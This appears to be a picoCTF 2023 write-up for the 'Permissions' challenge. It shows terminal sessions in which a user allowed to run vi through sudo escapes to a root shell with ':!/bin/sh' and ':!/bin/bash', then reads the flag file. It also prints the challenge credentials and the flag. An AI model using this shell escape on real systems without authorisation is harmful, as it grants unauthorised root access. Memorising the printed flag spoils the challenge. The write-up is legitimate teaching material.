### Permissions

#Medium #General-skills  #picoCTF2023 #vim

Author: Geoffrey Njogu

#### Description

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 61974 picoplayer@saturn.picoctf.net`Password: `e3pn6lmvHt`Can you login and read the root file?

##### Solution:

this website [GTFOBINS](https://gtfobins.github.io/) will help you

```css
picoplayer@challenge:/var$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/var$ vim -c ':!/bin/zsh'

/bin/bash: /bin/zsh: No such file or directory

shell returned 127

Press ENTER or type command to continue
picoplayer@challenge:/var$ vi -c ':!/bin/sh' /dev/null

$ exit

Press ENTER or type command to continue
picoplayer@challenge:/var$ sudo vi -c ':!/bin/sh' /dev/null

# ls
backups  cache	lib  local  lock  log  mail  opt  run  spool  tmp
# cd /
# ls
bin  boot  challenge  dev  etc	home  lib  lib32  lib64  libx32  media	mnt  opt  proc	root  run  sbin  srv  sys  tmp	usr  var
# cd root
# shell
/bin/sh: 5: shell: not found
# bash
root@challenge:~# ls
root@challenge:~# cd /root
root@challenge:~# ls
root@challenge:~# cd /
root@challenge:/# ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@challenge:/# cd challenge/
root@challenge:/challenge# ls
metadata.json
root@challenge:/challenge# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_f6ad392b}", "username": "picoplayer", "password": "e3pn6lmvHt"}root@challenge:/challenge# 


```

2nd method
use `:!/bin/bash` in vi

```css
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi test
~                                                                               
~                                                                               
~                                                                               
:!/bin/bash
root@challenge:/home/picoplayer# 


root@challenge:/home/picoplayer# ls
root@challenge:/home/picoplayer# pwd
/home/picoplayer
root@challenge:/home/picoplayer# cd /
root@challenge:/# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
root@challenge:/# cd challenge/
root@challenge:/challenge# ls
metadata.json
root@challenge:/challenge# cat metadata.json 
{"flag": "picoCTF{uS1ng_v1m_3dit0r_f6ad392b}", "username": "picoplayer", "password": "e3pn6lmvHt"}root@challenge:/challenge# 

```